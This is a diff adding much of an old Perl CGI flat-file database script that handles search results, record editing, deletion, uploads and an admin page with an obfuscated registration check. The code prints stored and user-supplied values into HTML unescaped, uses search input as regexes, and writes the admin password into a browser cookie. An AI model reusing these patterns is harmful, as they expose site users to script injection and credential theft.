+    @data = split(/::/,$line);
+    $id=$data[0];
+    shift(@data); #**Remove hidden key from view**
+    $owner=pop(@data); #**Remove membername from view**
+    chomp($owner);
+    if (($limitMemberSearch)&&($owner ne $userid)) {
+      next;
+    }
+    
+    # *** IF LINE MATCHES PATTERN ***********
+    $display="true";
+    $numPairs=@fields;
+    $numPairs=1 if ($searchbox)&&(exists($user_data{all_search}));
+    for ($i=0;$i<$numPairs;$i++) {
+      if ($value[$i]=~/[0-9][0-9]?\/[0-9][0-9]?\/[0-9][0-9]+/) {
+	$_=$value[$i];
+	@temp=m/([0-9][0-9]?\/[0-9][0-9]?\/[0-9][0-9]+)/g;
+	$temp[0]=&datetonum($temp[0]);
+	$temp[1]=&datetonum($temp[1]);
+	if (/^([><=]+)/) {$temp3=$1};
+	$criteria=$temp3.$temp[0];
+	if (/^between/i) {$criteria="between $temp[0] and $temp[1]"};
+	if ($data[$i]=~/[0-9][0-9]?\/[0-9][0-9]?\/[0-9][0-9]+/) {
+	  $dataval=&datetonum($data[$i]);
+	} else {
+	  $display="false";
+	};
+      } else {
+	$dataval=$data[$i];
+	$criteria=$value[$i];
+      };
+      
+      $_=$dataval;
+      #*** BEGIN SINGLE BOX ***
+      if (($searchbox)&&(exists($user_data{all_search}))) {
+	$_=$line;
+	$criteria=$user_data{all_search};
+	if (!exists($user_data{allany})) {
+	  $user_data{allany}=" and ";
+	}
+	$criteria=~s/ /$user_data{allany}/g;
+      }
+      #*** END SINGLE BOX 
+      $criteria=~s/ or /\|/gi;
+      #remove currency and commas
+      if (/^[\d\£\$\,\.]+$/) {
+	$_=~s/[\£\$\,]//g;
+	$criteria=~s/[\£\$\,]//g;
+      }
+      $criteria=~s/([\*\+\?\.\/\(\)])/\\$1/g;
+      $firstchar=substr($criteria,0,1);
+      $combo="false";
+      if (!((/$criteria/i)||($criteria eq "")||
+	    ($firstchar eq '<')||($firstchar eq '>')||
+	    ($criteria=~/ and /i))) {
+	$display="false";
+      };
+      
+      if ((substr($criteria,0,2) eq '<=')&&($_ > substr($criteria,2,99))) {
+	$combo="true";
+	$display="false";
+      };
+      if ((substr($criteria,0,2) eq '>=')&&($_ <  substr($criteria,2,99))) {
+	$combo="true";
+	$display="false";
+      };
+      
+      if (($combo ne "true")&&(substr($criteria,1,1) ne '=')) {
+	if ((substr($criteria,0,1) eq '<')&&($_ >= substr($criteria,1,99))) {
+	  $display="false";
+	};
+	if ((substr($criteria,0,1) eq '>')&&($_ <= substr($criteria,1,99))) {
+	  $display="false";
+	};
+	
+	if ($criteria=~/^between.* and /i) {
+	  $andpos = index($criteria,'and');
+	  if ($andpos<8) {$display="false";};
+	  $val1 = substr($criteria,7,$andpos);
+	  $val2 = substr($criteria,$andpos+4,99);
+	  if (($_<$val1)||($_>$val2)) {
+	    $display="false";
+	  };
+	};
+	if (($criteria=~/ and /i)&&(!($criteria=~/^between/i))) {
+	  @cdata=split(/ and /i,$criteria);
+	  foreach $citem (@cdata) {
+	    if(!(/$citem/i)) {$display="false";};
+	  };
+	};      
+      };
+    };      
+    #***** DISPLAY THE LINE ****************
+    $min=($pagenum-1)*$reportLines;
+    $max=$pagenum*$reportLines;
+    if ($display eq "true") {
+      $count++;
+      if (($count>$min)&&($count<=$max)) {
+	if (!$searchTemplateOn) {
+	  #ALTERNATE TABLE COLORS
+	  if ($alt==0) {
+	    $alt=1;
+	    print "\n<TR";
+	    print " bgColor=\"$rowColor1\"" if length($rowColor1)>0;
+	    print ">";
+	  } else {
+	    $alt=0;
+	    print "\n<TR";
+	    print " bgColor=\"$rowColor2\"" if length($rowColor2)>0;
+	    print ">";
+	  }
+	  
+	  if ($reportForm==1) {
+	    if (length($viewButtonImage)>0) {
+	      print "<TD><A HREF=\"javascript:viewform($id)\">";
+	      print "<IMG SRC=\"$viewButtonImage\" BORDER=0></A></TD>";
+	    } else {
+	      print "<form>";
+	      if (length($user_data{cgilanguage})>0) {
+		print "<INPUT TYPE=HIDDEN NAME=\"cgilanguage\" VALUE=\"$user_data{cgilanguage}\">\n";
+	      } 
+	      print "<TD><input type=button value=\"$viewButtonLabel\"";
+	      print " onClick=\"viewform($id)\"></TD></form>"; 
+	    };
+	  };
+	  
+	  #***** BEGIN DISPLAY DATA LOOP *******
+	  foreach (@sequence) {
+	    $n=$data[$_];
+	    $n=~s/\r/<BR>/g;
+	    if ($n eq "") {$n='&nbsp;';};
+	    $n=~s/^([0-9a-zA-Z_\-\.\~]+\@[0-9a-zA-Z_\-\.\~]+\.[0-9a-zA-Z_\-\.\~]+)/<A HREF=mailto:$1>$1<\/A>/g;
+	    if ($n=~/^([^ ]+\.(gif|jpg))$/i) {
+	      $n="<IMG SRC=$1>"
+	    } else {
+	      &gettype($types[$_+1]);
+	      if ($type ne "upload") {
+		$n=~s/^(http[^ \<\>]+)/<A HREF=$1>$1<\/A>/g;
+	      } else {
+		@filenameparts=split('_',$n);
+		$filename=@filenameparts[$#filenameparts];
+		$n=~s/^(http[^ \<\>]+)/<A HREF=$1>$filename<\/A>/g;
+	      }
+	    };
+	    print "<TD><FONT $tableFont>$n</FONT></TD>";
+	  };
+	} else {
+	  @escape=();
+	  foreach (@data) {
+	    $tempescape=escape($_);
+	    push(@escape,$tempescape);
+	  }
+	  #BEGIN SEARCHTEMPLATE SUBSTITUTION
+          if (!$templateNoSubstitute) {
+            $uploadcount=1;
+            foreach (@data) {
+              &gettype($types[$uploadcount]);
+              s/^([0-9a-zA-Z_\-\.\~]+\@[0-9a-zA-Z_\-\.\~]+\.[0-9a-zA-Z_\-\.\~]+)/<A HREF=mailto:$1>$1<\/A>/g;
+              if ($_!~/\.(gif|jpg)$/) {
+                if ($type eq "upload") {
+                  @filenameparts=split('_',$_);
+                  $filename=@filenameparts[$#filenameparts];
+                  $_=~s/^(http[^ \<\>]+)/<A HREF=$1>$filename<\/A>/g;
+                } else {
+                s/^(http[^ ]+)/<A HREF=$1>$1<\/A>/g;
+                };
+              };
+              s/^([^ ]+\.(gif|jpg))$/\<IMG SRC=$1\>/g;
+              $uploadcount++;
+            };
+          };
+	  $dateCreated=&getDate($id);
+	  $template=$searchTemplate;
+	  $template=~s/\$fields\[(\d+)\]/$fields[$1]/g;
+	  $template=~s/\$data\[(\d+)\]/$data[$1]/g;
+	  $template=~s/\$escape\[(\d+)\]/$escape[$1]/g;
+	  if (length($viewButtonImage)>0) {
+	    $template=~s/\$viewbutton/<A HREF=\"javascript:viewform($id)\"><IMG SRC=\"$viewButtonImage\" BORDER=0><\/A>/;
+	  } else {
+	    $template=~s/\$viewbutton/\<form><input type=button value=\"$viewButtonLabel\" onClick=\"viewform($id)\"\><\/form>/;
+	  }
+	  $template=~s/\$id/$id/g;
+	  $template=~s/\$datecreated/$dateCreated/g;
+	  print ($template);
+	}
+	#***** END DISPLAY DATA LOOP *********
+	print "</TR>" if !$searchTemplateOn;
+      };
+    };
+  };
+
+if (!$searchTemplateOn) {
+  print "\n</TABLE>\n";
+}
+  print "<BR>$reportFooter<BR>\n";
+  if ($count>0) {
+    print " 
+<SCRIPT LANGUAGE=JavaScript> 
+function viewform(id) { 
+document.vf.fid.value=id\; 
+document.vf.submit()\; 
+} 
+</SCRIPT> 
+<FORM NAME=\"vf\" ACTION=\"$cgilocation\" METHOD=GET> ";
+if (length($user_data{cgilanguage})>0) {
+  print "<INPUT TYPE=HIDDEN NAME=\"cgilanguage\"
+  VALUE=\"$user_data{cgilanguage}\">\n";
+} 
+print "
+<INPUT TYPE=HIDDEN NAME=\"fid\"> 
+<INPUT TYPE=HIDDEN NAME=\"query\" VALUE=\"$querystring\"> 
+<INPUT TYPE=HIDDEN NAME=\"cgifunction\" VALUE=\"form\"> 
+</FORM>\n"; 
+    $min++;
+    if ($max>$count) {$max=$count};
+    print "
+<B>$lang_results $min - $max $lang_of $count</B> 
+<table border=0 cellspacing=10 cellpadding=0><TR><TD>
+";
+    if ($nextprevButtons) {
+      if ($min>1) {print "
+
+<FORM ACTION=\"$cgilocation\" METHOD=POST>";
+		   if (length($user_data{cgilanguage})>0) {
+		     print "<INPUT TYPE=HIDDEN NAME=\"cgilanguage\"
+  VALUE=\"$user_data{cgilanguage}\">\n";
+		   } 	       
+		   print "
+<INPUT TYPE=HIDDEN NAME=\"query\" VALUE=\"$querystring\">
+<INPUT TYPE=HIDDEN NAME=\"pagenum\" VALUE=\"$pagenum\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" value=\"$previouspage\">
+</FORM>
+";};
+      if ($max<$count) {print "
+<TD>
+<FORM ACTION=\"$cgilocation\" METHOD=POST>";
+			if (length($user_data{cgilanguage})>0) {
+			  print "<INPUT TYPE=HIDDEN NAME=\"cgilanguage\"
+  VALUE=\"$user_data{cgilanguage}\">\n";
+			} 
+			print "
+<INPUT TYPE=HIDDEN NAME=\"query\" VALUE=\"$querystring\">
+<INPUT TYPE=HIDDEN NAME=\"pagenum\" VALUE=\"$pagenum\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" value=\"$nextpage\">
+</FORM>
+     "};
+    };
+    #CREATE LINKS TO ANY PAGENUMBER
+    if ($gotoPage) {
+      print "<TR><TD>$gotopage\: ";  
+      $numpages=int($count/$reportLines);
+      $myquery=$querystring;
+      if ($count/$reportLines>$numpages) {$numpages++;};
+      for ($i=1;$i<=$numpages;$i++) {
+	$myquery=~s/pagenum=[0-9]*/pagenum=$i/;
+	if ($pagenum==$i) {
+	  print "<FONT><B>$i </B></FONT>";
+	} else {
+	  print "<A HREF=\"$cgilocation\?$myquery\">$i</A> ";		 
+	}
+      };
+    };
+  } else {
+    print "<B>$noresultswerefound</B><P>";
+  };
+  if
+((length($user_data{cgilanguage})>0)&&($searchPage=~/cgifunction=user$/))
+{
+  $searchPage.="\&cgilanguage=$user_data{cgilanguage}";
+}
+  print "<TD><A HREF=\"$searchPage\"><B>$searchagain</B></A>\n" if $searchAgain;
+  print "<TD><A HREF=\"$homepage\"><B>$returntohomepage</B></A>\n" if $returnToHomepage;
+print "</TABLE><P><font size=-1><I>$poweredbywebteacher</I></font>";
+print "\n<BR>$reportPageFooter<BR>\n";
+};
+#*********END OF USERSEARCH SUBROUTINE************
+
+
+#*********BEGIN MAINTENANCE SUBROUTINE********
+sub maintenance {
+  &memberpass;
+  pop(@value);
+  
+  $maintenanceTemplateOn=(($maintenanceTemplateOn)&&($userid ne "admin"));
+  &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+  open(READLOG,"<$logfile") or &error("Could not open $logfile");
+  @entries = <READLOG>;
+  close READLOG;
+  &removelock; #remove lock file
+  foreach $line (@entries) {
+    @linedata = split(/::/,$line);
+    if ($linedata[0] eq $value[0]) {
+      
+      @fields=();
+      @types=();
+      open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+      @fieldsData=<FIELDS>;
+      close FIELDS;
+      foreach (@fieldsData) {
+	($field,$type)=split(/::/);
+	push(@fields,"$field\n");
+	push(@types,"$type");
+        $usemulti=1 if $type=~/upload/;
+      };
+      
+      shift(@fields);
+      shift(@types);
+      &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+      open(READLOG,"<$logfile") or &error("Could not open $logfile");
+      @entries = <READLOG>;
+      close READLOG;
+      &removelock; #remove lock file
+      foreach $entry (@entries) {
+        @parsed = split(/::/,$entry);
+        if ($parsed[0] eq $value[0]) {@data = @parsed};
+      };
+      print "
+<SCRIPT>
+function del() {
+if (confirm(\"Are you sure you want to delete this entry?\")) {
+document.form1.cgifunction.value=\"delete\"\;
+document.form1.submit()\;
+}}
+
+function modify() {
+document.form1.cgifunction.value=\"modify\"\;
+document.form1.submit()\;
+}
+
+function preview() {
+document.form1.cgifunction.value=\"form\"\;
+document.form1.submit()\;
+}
+
+function datecheck(cell) {
+  text=cell.value\;
+  slash=text.lastIndexOf(\"/\")\;
+  year=parseInt(text.substring(slash+1,99))\;
+  if (year<=50) {year=year+2000}\;
+  if ((year>50)&&(year<=99)) {year=year+1900}\;
+  result = text.substring(0,slash+1)+year\;
+  cell.value=result\;
+}
+
+function goadmin() {
+document.form1.cgifunction.value=\"";
+      if ($userid eq "admin") {
+	print "admin";
+      } else {
+	print "memberpage"
+      };
+      print "\"\;
+document.form1.submit()\;
+}
+</SCRIPT>
+
+
+<HEAD><TITLE>Modify or delete record</TITLE></HEAD>\n";
+      &bodytag;
+      print "<H1 align=center> Maintenance Page </H1>
+<form name=\"form1\" action=\"$cgilocation\" method=post";
+      print " ENCTYPE=\"multipart/form-data\"" if $usemulti==1;
+      print ">";
+      print "<TABLE BORDER=0>" if !$maintenanceTemplateOn;
+      
+      
+      $num = @fields;
+      $id=$data[0];
+      print "<TR><TD><B>ID</B></TD><TD>" if !$maintenanceTemplateOn;
+      print "<input type=hidden name=\"ID\" value=\"$id\">";
+      print "<B>$id</TD></TR>\n" if !$maintenanceTemplateOn;
+      $dateCreated=&getDate($id);
+      print "<TR><TD><B>Date Created</B></TD><TD>$dateCreated</TD></TR>\n" if !$maintenanceTemplateOn;
+      shift(@data);
+	$ftcount=0;
+        $hiddenfields="";
+	foreach $field (@fields) {
+	  $data[$ftcount]=~s/\"/\&quot\;/g;
+	  &gettype($types[$ftcount]);
+	  chop($field);
+	  $pf=&printField($type,$field,$data[$ftcount]);
+	  if (!$maintenanceTemplateOn) {
+	    print "<TR><TD><B>$field</B></TD><TD>";
+	    print "$pf";
+	    print "</TD></TR>\n";
+	  } else {
+	    if ($maintenanceTemplate!~/\$field\[$ftcount\]/) {
+	      $hiddenfields.="<INPUT TYPE=HIDDEN NAME=\"$field\" VALUE=\"$data[$ftcount]\">\n";
+	    }
+	    $maintenanceTemplate=~s/\$field\[$ftcount\]/$pf/g;
+	    $maintenanceTemplate=~s/\$data\[$ftcount\]/$data[$ftcount]/g;
+	    $maintenanceTemplate=~s/\$id/$id/g;
+	    $maintenanceTemplate=~s/\$datecreated/$dateCreated/g;
+	  }
+	  
+	  $ftcount++;
+	};
+      print "$maintenanceTemplate\n$hiddenfields<P>" if $maintenanceTemplateOn;
+
+      
+      
+      if (!$maintenanceTemplateOn) {print "<TR><TD colspan=4>"} else {print "<BR>"};
+print "<input type=button value=\"modify\" onClick=\"modify()\">
+<input type=button value=\"Delete\" onClick=\"del()\">
+<input type=button value=\"Preview\" onClick=\"preview()\">
+<input type=hidden name=\"fid\" value=\"$id\">
+<input type=hidden name=\"query\" value=\"$querystring\">
+<input type=hidden name=\"cgifunction\">";
+print "</TD></TR>\n</TABLE>" if !$maintenanceTemplateOn;
+print "\n</FORM>
+
+<h2>Modify will save the record with the new values.<BR>Delete will remove the record from the table</h2>";
+      
+      if (!$limitMembers) {
+	print "<A HREF=\"javascript:goadmin()\">Return to Administration Page</A><P>";
+      };
+      
+      print "
+<A HREF=\"$homepage\">
+Return to home page</A>
+";
+    };
+  };
+};
+#*********END MAINTENANCE SUBROUTINE*******
+
+#**BEGIN PRINT FIELD
+sub printField {
+local ($type,$field,$data)=@_;
+	  if ($type eq "text") {
+	        return "<input type=$type name=\"$field\" size=$typesize value=\"$data[$ftcount]\">";
+	  };
+   if ($type eq "upload") {
+         local $result= "<input type=hidden name=\"$field\" value=\"$data[$ftcount]\">";
+         if ($data=~/\.(gif|jpg)$/) {
+            $result.= "<IMG SRC=\"$data\" align=left>\n";
+         } else {
+                @filenameparts=split('_',$data);
+                $filename=@filenameparts[$#filenameparts];
+                $data=~s/^(http[^ \<\>]+)/<A HREF=$1><B>$filename<\/B><\/A>/g;
+                $result.= "$data\n";
+         }            
+         $result.= "<input type=file name=\"${field}_upload\">\n";
+	 return $result;
+   };
+	  if ($type eq "checkbox") {
+	        local $result= "<input type=$type name=\"$field\" value=\"yes\"";
+		  if ($data eq "yes") {$result.= " CHECKED"};
+		  $result.= ">";
+		return $result;
+	  };
+	  if ($type eq "list") {
+	    local $isInList=0;
+	    local $result= "<SELECT NAME=\"$field\" SIZE=1>\n";
+	    $result.= "<OPTION VALUE=\"\">\n";
+	    foreach (@typelistvals) {
+	      $result.= "<OPTION";
+	      if ($_ eq $data) {
+		$result.= " SELECTED";
+		$isInList=1;
+	      }
+	      $result.= ">$_</OPTION>\n";
+	    };
+	    if (!$isInList) {
+	      $result.= "<OPTION SELECTED>$data</OPTION>\n";
+	    };
+	    $result.= "</SELECT>\n";
+	    return $result;
+	  };
+	  if ($type eq "comment") {
+	    $data=~s/<BR>/\n/g;
+	    return "<TEXTAREA NAME=\"$field\" COLS=60 ROWS=$typerows WRAP=\"VIRTUAL\">$data</TEXTAREA>\n";
+	  };
+	};
+#**END PRINT FIELD
+
+#*********BEGIN GET DATE SUBROUTINE********
+sub getDate {
+  local ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst)=localtime($_[0]);
+  $mon++;
+  $year+=1900;
+  local $result;
+  if ($europeanDates) {$result="$mday/$mon/$year"} else {$result="$mon/$mday/$year"}
+  return $result;
+}
+#*********END GET DATE SUBROUTINE
+
+#**** BEGIN MODIFY SUBROUTINE *****
+sub modify {
+&memberpass;
+pop(@value);
+&putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+open(READLOG,"<$logfile") or &error("Could not open $logfile");
+@entries = <READLOG>;
+close READLOG;
+&removelock; #remove lock file
+foreach $item (@value) {
+	$item=~s/^( *)//ge;   # remove leading spaces from entries
+	$item=~s/::/'&#58;&#58;'/ge;  # replace delimiting character from entries
+	$item=~s/\r/\n/g;
+	$item=~s/\n\n/\n/g;
+	$item=~s/\n/<BR>/g;
+};
+@fields=();
+@types=();
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+foreach (@fieldsData) {
+	($field,$type)=split(/::/);
+	push(@fields,"$field\n");
+	push(@types,"$type");
+};
+shift(@fields);
+chomp(@fields);
+shift(@types);
+$missingReqs=0;
+$reqnum=0;
+$reqerror="";
+$uploadcount=0;
+foreach(@fields) {
+   &gettype($types[$uploadcount]);
+   $fname=$_;
+   if ((length($user_data{$fname})==0)&&($reqfields=~/(^|\,)$reqnum($|\,)/)) {
+     $reqerror.="<B>$fname</B> is a required field.<P>";
+     $missingReqs=1;
+   }
+   #UPLOAD IF IT IS AN UPLOAD FIELD
+    $upname="${fname}_upload";
+    if (($type eq "upload")&&(length($user_data{$upname})>0)) {
+      $deletename="${uploadsdir}${value[0]}_${fname}";
+      unlink <$deletename*>;
+      if ($user_data{$upname}=~/([^\\\/\:]+$)/) {$INfilename=lc($1)};
+          $INfilename=~s/[^a-zA-Z0-9\_\.]//g;
+          if ($INfilename=~/\.([a-zA-Z0-9]+)$/) {$extension=$1};
+          if ($typeexts!~/,*${extension},*/i) {
+        &error("Only the following filetypes are allowed. $typeexts");
+      }
+      $OUTfilename="${value[0]}_${fname}_${INfilename}";
+      $user_data{$fname}="${uploadsURL}$OUTfilename";
+      $uploadsize=0;
+      @filecontents=();
+      while ($bytesread=read($user_data{$upname},$buffer,1024)) {
+        $uploadsize+=length($buffer);
+        push(@filecontents,$buffer);
+      }
+    
+      if ($uploadsize>$typesize*1000) {
+        &error("upload size = $uploadsize bytes.<P>The upload can only be a maximum of ${typesize}KB")
+      };
+      open (OUTFILE,">${uploadsdir}${OUTfilename}") or &error("Could not open ${uploadsdir}$OUTfilename for writing");
+      binmode(OUTFILE);
+      print OUTFILE (@filecontents);
+      close OUTFILE;
+      close ($user_data{$upname});
+    }
+    
+    #END UPLOAD
+$uploadcount++;
+$reqnum++;
+}
+if ($missingReqs) {
+  &bodytag;
+  print "Your record was not added for the following reasons:<P>\n";
+  print "$reqerror";
+  print qq(<A HREF="javascript:history.go(-1)">Return to previous page</A>);
+  exit;
+}
+
+foreach $line (@entries) {
+        @data=split(/::/,$line);
+	  $len=@data;
+	  $owner=$data[$len-1];
+	  chop($owner);
+        if ($data[0] eq $value[0]) {
+		if (($owner eq $userid)||($userid eq "admin")) {
+		@value=($data[0]);
+		$fcount=1;
+		foreach (@fields) {
+			chop($_) if (/\n$/);
+			$value[$fcount]=$user_data{$_};
+			$fcount++;
+		};
+		foreach $item (@value) {
+			$item=~s/^( *)//ge;   # remove leading spaces from entries
+			$item=~s/::/'&#58;&#58;'/ge;  # replace delimiting character from entries
+			$item=~s/\r/\n/g;
+			$item=~s/\n\n/\n/g;
+			$item=~s/\n/<BR>/g;
+		};
+		    push(@value,$owner);
+                $line=join("::",@value)."\n";
+	      };
+        };
+};
+&putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+open(PUTLOG,">$logfile") or &error("Could not open $logfile");
+print PUTLOG (@entries);
+close PUTLOG;
+&removelock; #remove lock file.
+  $dateCreated=&getDate($value[0]);
+  $body="This record was first created on $dateCreated\n\n";
+foreach (@fields) {$body.="$_ = $user_data{$_}\n"};
+  if (length($email)>0) {
+    if ($^O=~/win/i) {
+      open (MAIL,">${uploadsdir}mail.txt");
+      print MAIL ("$body\n");
+      close MAIL;
+      $tmp=`$sendmail ${uploadsdir}mail.txt -s \"New Record Added to Database\" -t $email -q`;
+    } else {
+      open (MAIL,"|$sendmail -t") or &error("Could not open $sendmail");
+      print MAIL ("To: $email\nFrom: $email\n");
+      print MAIL ("Subject:New Record Added or Modified to Database\n$body\n");
+      close MAIL;
+    }
+  }
+@value=();
+if ($userid eq "admin") {&admin} else {&memberpage};
+};
+#***** END MODIFY SUBROUTINE*******
+
+
+#******* BEGIN DELETE SUBROUTINE ******
+sub delete {
+&memberpass;
+pop(@value);
+&putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+open(READLOG,"<$logfile") or &error("Could not open $logfile");
+@entries = <READLOG>;
+close READLOG;
+&removelock; #remove lock file
+
+foreach $line (@entries) {
+        @data=split(/::/,$line);
+	  $len=@data;
+	  $owner=$data[$len-1];
+	  chop($owner);
+        if (($data[0] ne $value[0])||(($userid ne "admin")&&($userid ne $owner))) {
+                push(@result,$line);
+        };
+};
+&putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+open(PUTLOG, ">$logfile") || die "Content-type: text/html\n\n
+<BODY BGCOLOR=WHITE><CENTER><H2>Could not open the file $logfile<P>
+If you have moved the file, you can correct this by changing lines 10 and 11
+of the webdata_[database name].cgi script to show the absolute path to the file.<P><P><P></h2>
+This cgi error was ";
+print PUTLOG (@result);
+close PUTLOG;
+&removelock; #remove lock file.
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+foreach (@fieldsData) {
+        ($field,$type)=split(/::/);
+        push(@fields,"$field\n");
+        push(@types,"$type");
+};
+chomp(@fields);
+shift(@fields);
+$fcount=1;
+foreach (@fields) {
+  if ($types[$fcount]=~/upload/) {
+    $uploadpath="${uploadsdir}${value[0]}";
+    unlink <$uploadpath*>;
+  }
+  $fcount++;
+};
+
+@value=();
+if ($limitMembers) {
+  print qq(Your entry has been deleted.<P><A HREF="$homepage">Return to homepage</A>);
+  exit;
+}
+if ($userid eq "admin") {&admin} else {&memberpage};
+};
+#****** END DELETE SUBROUTINE *******
+
+#****** BEGIN CACHE********
+sub cache {
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fields=<FIELDS>;
+close FIELDS;
+if (&fieldnames($value[0]) eq "true") {
+$fields[0] = "$value[0]\n";
+open(FIELDS,">$fieldnames") or &error("Could not open $fieldnames");
+print FIELDS (@fields);
+close FIELDS;
+@value=();
+&admin;
+} else {
+print "incorrect registration";
+};
+};
+
+#****** END CACHE ********
+
+#****** BEGIN ADMIN SUBROUTINE ******
+sub admin {
+pop(@value);
+&checkpass;
+open(FIELDS,"<$fieldnames") or &error("Content-type: text/html\n\n
+<BODY BGCOLOR=WHITE> <h2>Could not open <font color=blue>$fieldnames</font>  <P>
+Make sure the path is correct.  If you have moved the data files, you can
+correct this by changing lines 10 and 11 in the cgi script.<P><BR></P>
+<P><BR></P><P><BR></P><P><BR></P></h2><font size=3>This cgi error was ");
+@cache = <FIELDS>;
+close FIELDS;
+chop($cache[0]);
+$cacheval = substr(@cache[0],0,7);
+$tmp=&getFields;
+print "$tmp";
+if (&fieldnames($cache[0]) ne 'true') {
+  if ($cacheval eq "webdata") {
+      $num=substr(@cache[0],7,99);
+      $num = int(30-((time()-($b/307))/86400));
+	@parse=(82,101,103,105,115,116,114,97,116,105,111,110,32,21,101,120,112,105,114,101,100);
+      print "
+
+<font size=4 color=green><B>";
+for ($m=0;$m<67;$m++) {print chr(hex($import[$m]))};
+print "$num";
+for ($m=66;$m<101;$m++) {print chr(hex($import[$m]))};
+$url=escape("$ENV{SERVER_NAME}$ENV{SCRIPT_NAME} $ENV{SERVER_ADMIN}");
+print "<BR><B>ID Code=$code</B>
+<A HREF=\"http://www.webteacher.com/webdata/register.htm?code=$code&v=$vendor&site=$url\">
+Click here to Register</A>
+</B></font>
+<BR>
+<form name=\"form3\" action=\"$cgilocation\" method=post>
+Enter your code:<input name=\"box1\" type=text size=15>
+<input name=\"cgifunction\" type=hidden value=\"cache\">
+<input type=submit value=\"submit registration\">
+</form>
+";
+if($num<0) {foreach (@parse) {print (chr($_))};$iCache=1;exit;}
+
+
+} else {
+    @parse=(84,104,101,114,101,32,105,115,32,97,32,112,114,111,98,108,101,109,32);
+    push(@parse,119,105,116,104,32,116,104,101,32,114,101,103,105,115,116,114,97,116,105,111,110,32,99,111,100,101);
+    foreach (@parse) {print (chr($_))};
+    exit;
+};
+};
+    print "<script>document.cookie=\"admin=$password\"</script>\n";
+    print "
+
+";
+@fields=();
+@types=();
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+$usemulti=0;
+foreach (@fieldsData) {
+	($field,$type)=split(/::/);
+	push(@fields,"$field\n");
+	push(@types,"$type");
+ $usemulti=1 if $type=~/upload/;
+};
+shift(@fields);
+shift(@types);
+local $tmp=eval("\$k"."ey/307");
+local $tmp2=eval("\$n"."um");
+if ($tmp2>0) {if ($tmp2 != int(30-((time()-($b/307))/86400))) {$tmp=1.25}};
+if ($tmp != int($tmp)) {
+  @parse=(84,104,101,114,101,32,105,115,32,97,32,112,114,111,98,108,101,109,32);
+  push(@parse,119,105,116,104,32,116,104,101,32,114,101,103,105,115,116,114,97,116,105,111,110,32,99,111,100,101);
+  foreach (@parse) {print (chr($_))};
+  exit;
+};
+if ($num>30) {die "Invalid Date function"};
+print "
+<HEAD><TITLE>Webdata Admin Page</TITLE></HEAD>
+<BODY BGCOLOR=\"beige\">
+<H1 align=center> Administration Page </H1>";
+if (length($reqfields)>0) {
+  print "<font color=red><B>* </B>indicates required fields</font><BR>";
+}
+print "
+<form name=\"form1\" action=\"$cgilocation\" method=post";
+print " ENCTYPE=\"multipart/form-data\"" if $usemulti==1;
+print ">
+<TABLE BORDER=0>";
+$ftcount=0;
+print "<TR><TD><font color=orange><B>Date Created</B></font></TD><TD><input type=text size=15 name=\"date_created\"> (Date is added automatically, use for Search/modify only)</TD></TR>\n";
+foreach $field (@fields) {
+	  &gettype($types[$ftcount]);
+	  chop($field);
+	  print "<TR><TD>";
+	  print "<font color=red><B>* </B></font>" if $reqfields=~/(^|\,)$ftcount($|\,)/;
+	  print "<B>$field</B></TD>";
+	  if ($type eq "text") {
+	       print "<TD><input type=$type name=\"$field\" size=$typesize></TD></TR>\n";
+	  };
+	  if ($type eq "checkbox") {
+		  print "<TD><input type=checkbox name=\"$field\" value=\"yes\"></TD></TR>\n";
+	  };
+	  if ($type eq "list") {
+	  	  print "<TD><SELECT NAME=\"$field\" SIZE=1>\n";
+		  print "<OPTION VALUE=\"\">\n";
+		  foreach (@typelistvals) {
+			print "<OPTION>$_\n";
+		  };
+		  print "</SELECT></TD></TR>\n";
+	  };
+	  if ($type eq "comment") {
+		  print "<TD><TEXTAREA NAME=\"$field\" COLS=60 ROWS=$typerows></TEXTAREA></TD></TR>\n";
+	  };
+	  if ($type eq "upload") {
+	    print "<TD><INPUT NAME=\"$field\" TYPE=\"file\"></TD></TR>\n";
+	  };
+	  
+	  $ftcount++;
+};
+
+print "
+
+
+</TABLE>
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Add\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Search/modify\">
+<INPUT TYPE=RESET VALUE=\"Clear Form\"></FORM><P><HR>
+<FORM NAME=\"form2\" ACTION=\"$cgilocation\" METHOD=POST>
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Import data\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Export data\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Modify fields\"><P>
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Members\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Customize Pages\">
+</FORM> 
+
+
+<h2>
+Click \'Add\' to add a record to the database.
+
+<P>To modify or delete a record: Search for the record, then click on the record in the search results window.</h2>
+<A HREF=\"$searchPage\">
+Go to the user search page</A><P>
+
+<A HREF=\"$homepage\">
+Return to home page</A>
+
+
+";
+
+};
+
+
+#********END ADMIN SUBROUTINE***************
+
+#********BEGIN IMPORT USER PAGE**************
+sub import {
+&memberpass;
+print "
+<HEAD><TITLE>Webdata Import Data</TITLE></HEAD>
+<BODY BGCOLOR=\"BEIGE\">
+<h1 align=\"center\">Import a delimeted text file</h1>
+<h4>A delimeter is a character which is used to tell the database
+where one field stops, and the next one begins.  Most spreadsheet
+and database programs can save as either comma delimeted or tab 
+delimeted.  <P>
+
+This program will convert comma or tab delimeted text files to 
+Webdata\'s format, and append the file to your existing database.
+  The imported data file should be in the same sequence as your
+existing data.  Microsoft Excel is a good tool for resequencing
+data before saving to a delimeted text file. </h4>
+
